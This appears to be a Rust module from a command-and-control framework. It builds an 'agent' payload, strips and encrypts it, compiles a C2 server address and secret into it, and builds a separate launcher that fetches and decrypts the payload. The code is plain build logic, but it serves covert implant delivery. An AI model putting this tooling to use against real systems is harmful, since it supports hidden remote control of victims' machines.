//! Payload build pipeline: cargo build → strip → encrypt → write to `dist/`.

use anyhow::{anyhow, Context, Result};
use common::CryptoSession;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use tracing::{info, warn};

use crate::config::{partition_features, read_agent_features, PayloadConfig};

const LAUNCHER_PACKAGE: &str = "launcher";
const DIST_DIR: &str = "dist";

/// Build the agent for the given profile and write the encrypted payload to
/// `dist/<output_name>.enc`. Returns the path to the encrypted file.
pub fn build_payload(profile_name: &str, cfg: &PayloadConfig) -> Result<PathBuf> {
    let key = cfg.resolve_key()?;
    let triple = cfg.target_triple()?;
    let package = cfg.package.as_str();

    // Drop any feature flag that no longer exists in agent/Cargo.toml so a
    // profile saved by an older Builder still builds (Task 2.3).
    let available = read_agent_features().unwrap_or_default();
    let (effective_features, unknown_features) = if available.is_empty() {
        // Couldn't read agent/Cargo.toml – pass through and let cargo decide.
        (cfg.features.clone(), Vec::new())
    } else {
        partition_features(&cfg.features, &available)
    };
    for f in &unknown_features {
        warn!("profile feature `{f}` is not declared in agent/Cargo.toml; ignoring it");
    }

    // When outbound-c is requested, bake the server address (and optionally
    // the PSK) into the binary at compile time.
    let mut extra_env: Vec<(String, String)> = Vec::new();
    if effective_features.iter().any(|f| f == "outbound-c") {
        extra_env.push(("ORCHESTRA_C_ADDR".into(), cfg.c2_address.clone()));
        if let Some(ref secret) = cfg.c_server_secret {
            extra_env.push(("ORCHESTRA_C_SECRET".into(), secret.clone()));
        } else {
            warn!(
                "outbound-c feature enabled but c_server_secret is not set in the profile. \
                 The agent will require the ORCHESTRA_SECRET env var at runtime."
            );
        }
    }

    // Determine the binary target name (package name unless overridden).
    let bin_name = cfg.bin_name.as_deref().unwrap_or(package);

    info!(target_triple = %triple, package, bin = %bin_name, "Building agent payload");
    let bin_path = cargo_build(package, bin_name, &triple, &effective_features, &extra_env)?;

    // Best-effort strip — only meaningful for native / matching strip tool.
    if let Err(e) = strip_if_available(&bin_path) {
        warn!("strip step skipped: {e:#}");
    }

    let plaintext = std::fs::read(&bin_path)
        .with_context(|| format!("Failed to read built binary {}", bin_path.display()))?;

    let session = CryptoSession::from_shared_secret(&key);
    let encrypted = session.encrypt(&plaintext);

    std::fs::create_dir_all(DIST_DIR).with_context(|| format!("Failed to create {DIST_DIR}/"))?;
    let out_name = cfg
        .output_name
        .clone()
        .unwrap_or_else(|| profile_name.to_string());
    let out_path = Path::new(DIST_DIR).join(format!("{out_name}.enc"));
    std::fs::write(&out_path, &encrypted)
        .with_context(|| format!("Failed to write {}", out_path.display()))?;

    info!(
        plaintext_bytes = plaintext.len(),
        encrypted_bytes = encrypted.len(),
        path = %out_path.display(),
        "Encrypted payload written"
    );
    Ok(out_path)
}

/// Build the launcher for the same triple. The launcher is *not* encrypted —
/// it is the bootstrap that fetches and decrypts the payload. Returns the
/// path of the launcher inside `dist/`.
pub fn build_launcher_for_profile(profile_name: &str, cfg: &PayloadConfig) -> Result<PathBuf> {
    let triple = cfg.target_triple()?;
    info!(target_triple = %triple, "Building launcher");

    // Forward only features the launcher actually understands. For now that's
    // limited to `traffic-normalization` if/when it lands; unknown features
    // are passed through and cargo will reject any that don't exist.
    let launcher_features: Vec<String> = cfg
        .features
        .iter()
        .filter(|f| matches!(f.as_str(), "traffic-normalization"))
        .cloned()
        .collect();

    let bin_path = cargo_build(
        LAUNCHER_PACKAGE,
        LAUNCHER_PACKAGE,
        &triple,
        &launcher_features,
        &[],
    )?;

    std::fs::create_dir_all(DIST_DIR)?;
    let out_name = cfg
        .output_name
        .clone()
        .unwrap_or_else(|| profile_name.to_string());
    let ext = bin_path
        .extension()
        .and_then(|e| e.to_str())
        .map(|e| format!(".{e}"))
        .unwrap_or_default();
    let out_path = Path::new(DIST_DIR).join(format!("{out_name}-launcher{ext}"));
    std::fs::copy(&bin_path, &out_path)
        .with_context(|| format!("Failed to copy launcher to {}", out_path.display()))?;
    info!(path = %out_path.display(), "Launcher copied to dist/");
    Ok(out_path)
}

/// Run `cargo build --release --target <triple> -p <pkg> [--bin <bin>]` and
/// return the resulting binary path.
///
/// `bin_name` is the `[[bin]] name` target to build; when it equals `package`
/// no `--bin` flag is added (single-binary crates). `extra_env` is forwarded
/// as environment variables to the `cargo` subprocess — the Builder uses this
/// to inject `ORCHESTRA_C_ADDR` / `ORCHESTRA_C_SECRET` at build time so that
/// `option_env!()` in the agent source resolves to real values.
fn cargo_build(
    package: &str,
    bin_name: &str,
    triple: &str,
    features: &[String],
    extra_env: &[(String, String)],
) -> Result<PathBuf> {
    let mut cmd = Command::new("cargo");
    cmd.args(["build", "--release", "--target", triple, "-p", package]);
    // Only pass --bin when the target name differs from the package name.
    if bin_name != package {
        cmd.args(["--bin", bin_name]);
    }
    if !features.is_empty() {
        cmd.arg("--features").arg(features.join(","));
    }
    for (k, v) in extra_env {
        cmd.env(k, v);
    }
    cmd.stdout(Stdio::inherit()).stderr(Stdio::inherit());

    info!(?features, "cargo {:?}", cmd.get_args().collect::<Vec<_>>());
    let status = cmd
        .status()
        .with_context(|| format!("Failed to invoke cargo for {package}"))?;
    if !status.success() {
        return Err(anyhow!(
            "cargo build failed for {package}/{bin_name} ({status})"
        ));
    }

    let mut bin = PathBuf::from("target")
        .join(triple)
        .join("release")
        .join(bin_name);
    if triple.contains("windows") {
        bin.set_extension("exe");
    }
    if !bin.exists() {
        return Err(anyhow!("Expected binary not found at {}", bin.display()));
    }
    Ok(bin)
}

/// Run `strip` against a binary if a compatible strip is on PATH. Failures
/// are non-fatal because cross-strip is rarely installed.
fn strip_if_available(path: &Path) -> Result<()> {
    let strip = which::which("strip").map_err(|e| anyhow!("`strip` not on PATH: {e}"))?;
    let status = Command::new(strip)
        .arg(path)
        .status()
        .with_context(|| format!("Failed to invoke strip on {}", path.display()))?;
    if !status.success() {
        return Err(anyhow!("strip exited with {status}"));
    }
    info!(path = %path.display(), "binary stripped");
    Ok(())
}
